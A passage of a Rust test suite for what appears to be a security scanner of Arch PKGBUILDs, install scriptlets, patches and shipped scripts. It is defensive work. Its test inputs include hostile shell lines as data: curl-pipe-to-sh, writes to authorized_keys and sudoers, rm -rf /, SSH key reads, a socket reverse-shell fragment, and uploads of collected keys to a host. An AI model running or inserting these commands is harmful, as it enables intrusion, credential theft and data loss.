            "install -Dm755 foo \"$pkgdir/usr/bin/foo\"",
            "echo x > /dev/null",
            "make 2>&1",
        ] {
            assert!(
                !has(
                    &body("package", ok),
                    "writes-outside-package",
                    Severity::Warning
                ),
                "{ok}"
            );
        }
    }

    #[test]
    fn false_positives_found_in_real_packages_stay_fixed() {
        // `empty.sshd` is not ~/.ssh.
        assert!(!has(
            &body("build", "  -Dsshdprivsepdir=/usr/share/empty.sshd"),
            "secret-access",
            Severity::High
        ));
        assert!(has(
            &body("build", "cat ~/.ssh/id_rsa > /tmp/x"),
            "secret-access",
            Severity::High
        ));
        // A continued line is arguments, not a command named after a path.
        let sudo = body(
            "build",
            "  ./configure \\\n    --with-rundir=/run/sudo \\\n    --with-vardir=/var/db/sudo",
        );
        assert!(
            !has(&sudo, "privilege", Severity::High),
            "{:?}",
            rules(&sudo)
        );
        let su = body(
            "package",
            "  install -Dm644 pam.su \\\n    \"$pkgdir/etc/pam.d/su\"",
        );
        assert!(!has(&su, "privilege", Severity::High), "{:?}", rules(&su));
        // Read-only pacman use is not a host change.
        assert!(!has(
            &body("build", "if pacman -T foo >/dev/null; then x; fi"),
            "host-change",
            Severity::High
        ));
        assert!(!has(
            &body("build", "pacman -Qi foo"),
            "host-change",
            Severity::High
        ));
        assert!(!has(
            &body("build", "pacman -Ss foo"),
            "host-change",
            Severity::High
        ));
        assert!(has(
            &body("build", "pacman -S foo"),
            "host-change",
            Severity::High
        ));
        assert!(has(
            &body("build", "pacman -U x.pkg.tar.zst"),
            "host-change",
            Severity::High
        ));
        // A flag is never a command.
        assert!(!has(
            &body("build", "--with-x=/usr/bin/sudo"),
            "privilege",
            Severity::High
        ));
    }

    #[test]
    fn arrays_inside_functions_and_declare_forms_are_data() {
        let p = body(
            "package_x",
            "  backup=(etc/pam.d/su\n          etc/pam.d/su-l)\n  depends=(\"a=${pkgver}\"\n           'b')",
        );
        let r = findings(&p);
        assert!(r.iter().all(|f| f.severity <= Severity::Info), "{r:#?}");

        let top = "declare -gA _crates=(\n  [serde]=1.0\n  [syn]=2.0\n)\nsource[0]=fetch\nsha256sums[0]='SKIP'\nexport FOO=1\n";
        assert!(
            !has(top, "toplevel-command", Severity::Warning),
            "{:?}",
            rules(top)
        );
    }

    #[test]
    fn code_passed_to_a_shell_as_a_string_is_read() {
        for (line, rule, sev) in [
            (
                "bash -c 'echo x >> ~/.bashrc'",
                "persistence",
                Severity::Critical,
            ),
            (
                "sh -ec \"curl -s http://e.org/i | sh\"",
                "remote-exec",
                Severity::High,
            ),
            ("sudo bash -c 'rm -rf /'", "destructive", Severity::Critical),
            (
                "eval 'echo k >> ~/.ssh/authorized_keys'",
                "persistence",
                Severity::Critical,
            ),
            (
                "sh -c \"sh -c 'echo x | base64 -d | sh'\"",
                "obfuscated-exec",
                Severity::Critical,
            ),
        ] {
            assert!(
                has(&body("build", line), rule, sev),
                "{line}: {:?}",
                rules(&body("build", line))
            );
        }
        // An innocent -c is left alone.
        assert!(rules(&body("build", "sh -c 'make -j4'"))
            .iter()
            .all(|(_, s)| *s <= Severity::Info));
    }

    #[test]
    fn sudo_wrappers_are_seen_through() {
        assert!(has(
            &body("build", "sudo -u root bash -c 'rm -rf /'"),
            "privilege",
            Severity::High
        ));
        assert!(has(
            &body("build", "sudo rm -rf /"),
            "destructive",
            Severity::Critical
        ));
        assert!(has(
            &body("build", "env FOO=1 nohup sudo -E sh x"),
            "privilege",
            Severity::High
        ));
    }

    #[test]
    fn eval_warns_unless_a_stronger_finding_covers_the_line() {
        assert!(has(
            &body("build", "eval \"$cmd\""),
            "eval",
            Severity::Warning
        ));
        let r = rules(&body("build", "eval \"$(curl http://x)\""));
        assert!(r.contains(&("remote-exec", Severity::High)));
        assert!(!r.iter().any(|(rule, _)| *rule == "eval"), "{r:?}");
    }

    #[test]
    fn sources_checksums_and_schemes() {
        let p = "pkgname=x\nsource=(\"http://example.org/a.tar.gz\" \"https://example.org/b.tar.gz\")\nsha256sums=('aa' 'SKIP')\n";
        let r = rules(p);
        assert!(r.contains(&("insecure-source", Severity::Warning)));
        assert!(r.contains(&("checksum-skipped", Severity::Warning)));

        let none = "pkgname=x\nsource=(\"https://example.org/a.tar.gz\")\n";
        assert!(has(none, "missing-checksums", Severity::Warning));

        let vcs = "pkgname=x\nsource=(\"git+https://example.org/a.git\")\nsha256sums=('SKIP')\n";
        let r = rules(vcs);
        assert!(
            !r.iter()
                .any(|(rule, _)| *rule == "checksum-skipped" || *rule == "missing-checksums"),
            "{r:?}"
        );

        let weak = "pkgname=x\nsource=(\"https://e.org/a.tar.gz\")\nmd5sums=('aa')\n";
        assert!(has(weak, "weak-checksums", Severity::Info));
    }

    #[test]
    fn arch_specific_sources_are_checked_too() {
        let p = "source_x86_64=(\"http://e.org/a\")\nsha256sums_x86_64=('SKIP')\n";
        let r = rules(p);
        assert!(r.contains(&("insecure-source", Severity::Warning)));
        assert!(r.contains(&("checksum-skipped", Severity::Warning)));
    }

    #[test]
    fn dynamic_fields_are_reported_not_guessed() {
        let p = "pkgname=x\nsource=($(curl -s http://x/list))\nsha256sums=('SKIP')\n";
        assert!(has(p, "dynamic-field", Severity::Info));
        let q = "depends=(`cat /etc/x`)\n";
        assert!(has(q, "dynamic-field", Severity::Info));
    }

    #[test]
    fn top_level_code_is_flagged() {
        let p = "pkgname=x\ncurl http://x/a | sh\n";
        let r = rules(p);
        assert!(r.contains(&("remote-exec", Severity::High)), "{r:?}");
        assert!(
            r.contains(&("toplevel-command", Severity::Warning)),
            "{r:?}"
        );
        // Plain conditionals and exports are fine.
        let ok = "if [ -n \"$x\" ]; then\n  y=1\nfi\nexport FOO=1\n";
        assert!(!has(ok, "toplevel-command", Severity::Warning));
    }

    #[test]
    fn install_scriptlet_is_found_and_scanned_as_root_code() {
        let pkg = "pkgname=x\ninstall=x.install\n";
        assert_eq!(scriptlet_name(pkg).as_deref(), Some("x.install"));
        assert_eq!(scriptlet_name("install=../x\n"), None, "no path tricks");
        assert_eq!(scriptlet_name("pkgname=x\n"), None);

        let script = "post_install() {\n  curl -s http://x | sh\n  systemctl daemon-reload\n  sudo true\n}\n";
        let report = audit("t", pkg, Some(("x.install", script)), &[]);
        let f: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.file == "x.install")
            .map(|f| (f.rule, f.severity))
            .collect();
        assert!(f.contains(&("remote-exec", Severity::High)), "{f:?}");
        assert!(f.contains(&("install-scriptlet", Severity::Info)), "{f:?}");
        // pkgbuild-only rules (privilege, host-service) don't apply to it.
        assert!(
            !f.iter()
                .any(|(r, _)| *r == "privilege" || *r == "host-service"),
            "{f:?}"
        );
        assert_eq!(report.verdict(), Verdict::Confirm);
    }

    // ---- u16: more obfuscation coverage and the rest of the repo

    fn extra(path: &str, text: &str) -> ExtraFile {
        ExtraFile {
            path: path.to_string(),
            bytes: text.as_bytes().to_vec(),
        }
    }

    fn extras_report(extras: &[ExtraFile]) -> Vec<(String, &'static str, Severity)> {
        audit("t", "pkgname=x\n", None, extras)
            .findings
            .into_iter()
            .map(|f| (f.file, f.rule, f.severity))
            .collect()
    }

    fn extra_has(extras: &[ExtraFile], file: &str, rule: &str, severity: Severity) -> bool {
        extras_report(extras)
            .iter()
            .any(|(f, r, s)| f == file && *r == rule && *s == severity)
    }

    #[test]
    fn download_then_run_is_high_but_only_for_what_was_downloaded() {
        for lines in [
            "curl -o inst.sh http://x/i\nsh inst.sh",
            "wget -O i http://x/i; chmod +x i; ./i",
            "curl -O http://x/foo.sh\nbash foo.sh",
            "curl -s http://x/i > inst\nsource ./inst",
            "wget http://x/setup.py && python3 setup.py",
        ] {
            assert!(
                has(&body("build", lines), "download-then-run", Severity::High),
                "{lines}"
            );
        }
        for ok in [
            "curl -o src.tar.gz http://x/a.tar.gz\ntar xf src.tar.gz",
            "curl -o a.sh http://x/a\nsh other.sh",
            "wget http://x/a.tar.gz\nmake",
            // Discarded output is not a saved file (byobu).
            "wget -q -O- http://x </dev/null >\"$c\" 2>/dev/null &\nif eval $T route >/dev/null 2>&1; then :; fi",
            "curl -s http://x >/dev/null\nsh null",
        ] {
            assert!(
                !has(&body("build", ok), "download-then-run", Severity::High),
                "{ok}"
            );
        }
    }

    #[test]
    fn unpacking_into_a_shell_is_high() {
        for line in [
            "gpg -d payload.gpg | sh",
            "zcat x.gz | bash",
            "tar -xOf a.tar run.sh | sh",
            "unzip -p a.zip run.sh | bash",
            "xz -dc x.xz | sh",
        ] {
            assert!(
                has(&body("build", line), "extract-pipe-exec", Severity::High),
                "{line}"
            );
        }
        for ok in [
            "tar xf a.tar",
            "zcat x.gz | grep foo",
            "gpg --verify a.sig a",
        ] {
            assert!(
                !has(&body("build", ok), "extract-pipe-exec", Severity::High),
                "{ok}"
            );
        }
    }

    #[test]
    fn escape_spelled_and_runtime_built_commands() {
        assert!(has(
            &body("build", "$'\\x63\\x75\\x72\\x6c' -s http://x"),
            "obfuscated-command",
            Severity::High
        ));
        // Ordinary ANSI-C strings as arguments, and lone colour codes, are fine.
        for ok in [
            "IFS=$'\\n'",
            "echo -e $'\\033[0m' done",
            "$'\\033[1m'bold",
            "$'\\e]0;title\\a'",
        ] {
            assert!(
                !has(&body("build", ok), "obfuscated-command", Severity::High),
                "{ok}"
            );
        }
        for line in [
            "$a$b -s http://x",
            "${cmd} run",
            "$(echo curl) x",
            "`echo sh` y",
        ] {
            assert!(
                has(&body("build", line), "dynamic-command", Severity::Warning),
                "{line}"
            );
        }
        for ok in [
            "$CC -o x y.c",
            "${MAKE:-make} install",
            "\"$srcdir/configure\" --prefix=/usr",
            "$MAKE",
            "echo $a$b",
            "\"$@\"",
        ] {
            assert!(
                !has(&body("build", ok), "dynamic-command", Severity::Warning),
                "{ok}"
            );
        }
    }

    #[test]
    fn long_encoded_blobs_are_flagged_and_hashes_are_not() {
        let blob = "QUFB".repeat(70);
        assert!(has(
            &body("build", &format!("echo {blob} > x")),
            "encoded-blob",
            Severity::Warning
        ));
        let sha = "a".repeat(64);
        assert!(!has(
            &body("build", &format!("echo {sha} > x")),
            "encoded-blob",
            Severity::Warning
        ));
    }

    #[test]
    fn extra_scripts_get_the_dangerous_pattern_rules() {
        let f = [extra("helper.sh", "#!/bin/sh\necho 'x' >> ~/.bashrc\n")];
        // A shipped script editing a shell rc file is high, not critical.
        assert!(extra_has(&f, "helper.sh", "persistence", Severity::High));

        let py = [extra(
            "setup.py",
            "import os\nos.system(\"curl http://x/i | sh\")\n",
        )];
        assert!(extra_has(&py, "setup.py", "remote-exec", Severity::High));

        let enc = [extra(
            "run.py",
            "import base64\nexec(base64.b64decode('aGk='))\n",
        )];
        assert!(extra_has(
            &enc,
            "run.py",
            "obfuscated-exec",
            Severity::Critical
        ));

        let sock = [extra(
            "r.py",
            "import socket,os\ns=socket.socket()\nos.dup2(s.fileno(),0)\n",
        )];
        assert!(extra_has(
            &sock,
            "r.py",
            "reverse-shell",
            Severity::Critical
        ));

        // Found by shebang even without an extension, and nested.
        let nested = [extra("bin/launcher", "#!/bin/bash\nrm -rf ~\n")];
        assert!(extra_has(
            &nested,
            "bin/launcher",
            "destructive",
            Severity::Critical
        ));
    }

    #[test]
    fn extra_scripts_skip_the_pkgbuild_only_rules() {
        // A shipped wrapper may legitimately do these.
        let f = [extra(
            "wrapper.sh",
            "#!/bin/sh\nsudo make install\ncp a /usr/bin/a\ngit clone https://x/y\n",
        )];
        let r = extras_report(&f);
        assert!(r.iter().all(|(_, _, s)| *s <= Severity::Info), "{r:?}");
    }

    #[test]
    fn patches_are_read_by_their_added_lines_and_capped_at_warning() {
        let patch = "--- a/x\n+++ b/x\n@@ -1,2 +1,3 @@\n context\n-removed sudo line\n+curl http://x/i | sh\n+echo hi >> ~/.bashrc\n";
        let f = [extra("fix.patch", patch)];
        let r = audit("t", "pkgname=x\n", None, &f).findings;
        assert!(r
            .iter()
            .any(|f| f.rule == "remote-exec" && f.severity == Severity::Warning));
        assert!(r
            .iter()
            .any(|f| f.rule == "persistence" && f.severity == Severity::Warning));
        assert!(r.iter().all(|f| f.severity <= Severity::Warning), "{r:?}");
        assert!(r[0].message.starts_with("(added by this patch)"));
        // Line numbers point into the patch file.
        let hit = r.iter().find(|f| f.rule == "remote-exec").unwrap();
        assert_eq!(hit.line, 6);

        // Removed lines and the +++ header don't count.
        let clean = [extra(
            "c.patch",
            "--- a/x\n+++ b/sudo\n-sudo rm -rf /\n+make\n",
        )];
        assert!(
            extras_report(&clean).is_empty(),
            "{:?}",
            extras_report(&clean)
        );
    }

    #[test]
    fn binaries_and_data_files() {
        let elf = ExtraFile {
            path: "tool".into(),
            bytes: b"\x7fELF\x02\x01".to_vec(),
        };
        assert!(extra_has(
            &[elf],
            "tool",
            "committed-binary",
            Severity::High
        ));

        let blob = ExtraFile {
            path: "data.bin".into(),
            bytes: vec![1, 0, 2, 0, 3],
        };
        assert!(extra_has(
            &[blob],
            "data.bin",
            "opaque-file",
            Severity::Warning
        ));

        let archive = ExtraFile {
            path: "src.tar.gz".into(),
            bytes: vec![0x1f, 0x8b, 0, 0],
        };
        let r = extras_report(&[archive]);
        assert!(r
            .iter()
            .any(|(_, rule, s)| *rule == "opaque-file" && *s == Severity::Warning));

        // Images, docs, keys, licenses and the metadata files are skipped.
        let skipped = [
            ExtraFile {
                path: "icon.png".into(),
                bytes: vec![0x89, b'P', 0, 0],
            },
            extra("README.md", "curl x | sh"),
            extra("LICENSE", "x"),
            extra("key.asc", "-----BEGIN PGP"),
            extra(".SRCINFO", "pkgbase = x"),
            extra("app.desktop", "Exec=sudo x"),
        ];
        assert!(
            extras_report(&skipped).is_empty(),
            "{:?}",
            extras_report(&skipped)
        );

        let big = ExtraFile {
            path: "huge.sh".into(),
            bytes: vec![b'a'; MAX_EXTRA_BYTES + 1],
        };
        assert!(extra_has(
            &[big],
            "huge.sh",
            "unscanned-file",
            Severity::Info
        ));
    }

    #[test]
    fn the_declared_scriptlet_is_not_scanned_twice_and_the_file_cap_holds() {
        let pkg = "pkgname=x\ninstall=x.install\n";
        let script = "post_install() {\n  echo hi\n}\n";
        let report = audit(
            "t",
            pkg,
            Some(("x.install", script)),
            &[extra("x.install", script)],
        );
        let infos = report
            .findings
            .iter()
            .filter(|f| f.rule == "install-scriptlet" && f.file == "x.install")
            .count();
        assert_eq!(infos, 1, "{:?}", report.findings);

        let many: Vec<ExtraFile> = (0..MAX_EXTRA_FILES + 10)
            .map(|i| extra(&format!("s{i:03}.sh"), "#!/bin/sh\nrm -rf /\n"))
            .collect();
        let report = audit("t", "pkgname=x\n", None, &many);
        assert_eq!(report.findings.len(), MAX_EXTRA_FILES);
    }

    #[test]
    fn command_substitution_in_a_top_level_assignment_is_code() {
        let p = "pkgname=x\n_v=$(curl -s http://x/v | sh)\n";
        assert!(has(p, "remote-exec", Severity::High), "{:?}", rules(p));
        let q = "pkgname=x\nsource=($(echo aGk= | base64 -d | sh))\n";
        assert!(
            has(q, "obfuscated-exec", Severity::Critical),
            "{:?}",
            rules(q)
        );
        // An ordinary computed value is not a finding.
        let ok = "pkgname=x\n_d=$(date +%Y)\n";
        assert!(
            rules(ok).iter().all(|(_, s)| *s <= Severity::Info),
            "{:?}",
            rules(ok)
        );
    }

    #[test]
    fn persistence_is_judged_by_where_a_command_writes() {
        // Reads and /dev/null redirects are not writes.
        for ok in [
            "grep -q \"$i\" /etc/passwd > /dev/null",
            "cp /etc/profile /tmp/x",
            "cat ~/.bashrc",
            "install -Dm644 x \"$pkgdir/etc/skel/.bashrc\"",
        ] {
            assert!(
                !rules(&body("package", ok))
                    .iter()
                    .any(|(r, _)| *r == "persistence"),
                "{ok}"
            );
        }
        // Writes to the account/trust files are critical anywhere.
        for line in [
            "echo k >> /root/.ssh/authorized_keys",
            "cp x /etc/ld.so.preload",
            "sed -i s/a/b/ /etc/sudoers",
        ] {
            assert!(
                has(&body("package", line), "persistence", Severity::Critical),
                "{line}"
            );
            let script = [extra("x.sh", &format!("#!/bin/sh\n{line}\n"))];
            assert!(
                extra_has(&script, "x.sh", "persistence", Severity::Critical),
                "{line}"
            );
        }
        // Shell rc files: critical in a PKGBUILD, high in an install scriptlet.
        let rc = "echo 'source /usr/share/x/init.sh' >> ~/.bashrc";
        assert!(has(&body("build", rc), "persistence", Severity::Critical));
        let report = audit(
            "t",
            "pkgname=x\ninstall=x.install\n",
            Some(("x.install", &format!("post_install() {{\n  {rc}\n}}\n"))),
            &[],
        );
        assert!(report
            .findings
            .iter()
            .any(|f| f.rule == "persistence" && f.severity == Severity::High));
        assert_eq!(report.verdict(), Verdict::Confirm);
    }

    #[test]
    fn scriptlet_names_are_expanded_from_the_pkgbuild() {
        assert_eq!(
            scriptlet_name("pkgname=foo\ninstall=$pkgname.install\n").as_deref(),
            Some("foo.install")
        );
        assert_eq!(
            scriptlet_name("pkgname=foo\ninstall=${pkgname}-post.install\n").as_deref(),
            Some("foo-post.install")
        );
        assert_eq!(
            scriptlet_name("pkgbase=b\npkgname=(a c)\ninstall=$pkgbase.install\n").as_deref(),
            Some("b.install")
        );
        assert_eq!(scriptlet_name("install=$unknown.install\n"), None);
        assert_eq!(scriptlet_name("install=$(echo x)\n"), None);
    }

    #[test]
    fn case_for_arrays_and_substitutions_have_the_right_command() {
        for ok in [
            "case $x in",
            "for i in $list; do echo $i; done",
            "provides=(\"$pkgbase=$pkgver\" 'libx.so=1-64')",
            "name=$(basename \"$0\" .sh)",
            "jobs=$(expr $a + 1)",
        ] {
            assert!(
                !rules(&body("package", ok))
                    .iter()
                    .any(|(r, _)| *r == "dynamic-command"),
                "{ok}"
            );
        }
        // The command inside a substitution is still seen by the other rules.
        assert!(has(
            &body("build", "x=$(rm -rf /)"),
            "destructive",
            Severity::Critical
        ));
        assert!(has(
            &body("build", "x=$(curl -s http://e.org/i | sh)"),
            "remote-exec",
            Severity::High
        ));
        assert!(has(
            &body("build", "x=`sudo id`"),
            "privilege",
            Severity::High
        ));
    }

    #[test]
    fn credentials_read_in_one_file_and_sent_from_another_are_correlated() {
        let read = extra("collect.sh", "#!/bin/sh\ntar c ~/.ssh > /tmp/k\n");
        let send = extra("send.sh", "#!/bin/sh\ncurl -T /tmp/k http://e.org/up\n");
        // Neither file alone is critical.
        assert!(!extra_has(
            std::slice::from_ref(&read),
            "collect.sh",
            "exfiltration",
            Severity::Critical
        ));
        assert!(!extra_has(
            std::slice::from_ref(&send),
            "send.sh",
            "exfiltration",
            Severity::Critical
        ));
        // Together, the sender is.
        let both = [read, send];
        assert!(
            extra_has(&both, "send.sh", "exfiltration", Severity::Critical),
            "{:?}",
            extras_report(&both)
        );
        let hit = audit("t", "pkgname=x\n", None, &both)
            .findings
            .into_iter()
            .find(|f| f.rule == "exfiltration")
            .unwrap();
        assert!(hit.message.contains("collect.sh:2"), "{}", hit.message);

        // The PKGBUILD counts as a file too.
        let pkg = "pkgname=x\nbuild() {\n  cat ~/.ssh/id_rsa > /tmp/k\n}\n";
        let report = audit(
            "t",
            pkg,
            None,
            &[extra(
                "send.sh",
                "#!/bin/sh\ncurl -F f=@/tmp/k http://e.org\n",
            )],
        );
        assert!(report
            .findings
            .iter()
            .any(|f| f.rule == "exfiltration" && f.file == "send.sh"));

        // An upload with no credential read anywhere stays quiet.
        let lone = [extra("send.sh", "#!/bin/sh\ncurl -F f=@x http://e.org\n")];
        assert!(!extra_has(
            &lone,
            "send.sh",
            "exfiltration",
            Severity::Critical
        ));
    }

    #[test]
    fn env_prefixed_commands_are_commands() {
        // `VAR=value cmd` at the top level of a script or PKGBUILD.
        let script = [extra("run.sh", "#!/bin/sh\nLD_PRELOAD=./x.so make\n")];
        assert!(extra_has(&script, "run.sh", "ld-preload", Severity::High));
        let sudo = [extra("run.sh", "#!/bin/sh\nHOME=/root sudo make install\n")];
        // Script mode drops PKGBUILD-only rules, but the command is now read:
        assert!(!extra_has(&sudo, "run.sh", "privilege", Severity::High));
        let rm = [extra("run.sh", "#!/bin/sh\nFOO=1 rm -rf /\n")];
        assert!(extra_has(&rm, "run.sh", "destructive", Severity::Critical));
        // A plain assignment is still just an assignment.
        let plain = [extra("run.sh", "#!/bin/sh\nFOO=bar\nBAZ=\"a b c\"\n")];
        assert!(
            extras_report(&plain).is_empty(),
            "{:?}",
            extras_report(&plain)
        );
    }

    #[test]
    fn verdict_follows_the_highest_severity() {
        let ok = audit("t", "pkgname=x\n", None, &[]);
        assert_eq!(ok.verdict(), Verdict::Allow);
        let warn = audit("t", &body("build", "git clone https://x"), None, &[]);
        assert_eq!(warn.verdict(), Verdict::Allow);
        let high = audit("t", &body("build", "sudo make"), None, &[]);
        assert_eq!(high.verdict(), Verdict::Confirm);
        let crit = audit("t", &body("build", "echo x >> ~/.bashrc"), None, &[]);
        assert_eq!(crit.verdict(), Verdict::Block);
        assert_eq!(
            crit.findings[0].severity,
            Severity::Critical,
            "most severe first"
        );
    }

    #[test]
    fn findings_carry_the_line_number_and_excerpt() {
        let p = "pkgname=x\n\nbuild() {\n  make\n  sudo make install\n}\n";
        let f = findings(p);
        let hit = f.iter().find(|f| f.rule == "privilege").unwrap();
        assert_eq!((hit.file.as_str(), hit.line), ("PKGBUILD", 5));
        assert_eq!(hit.excerpt, "sudo make install");
    }
}
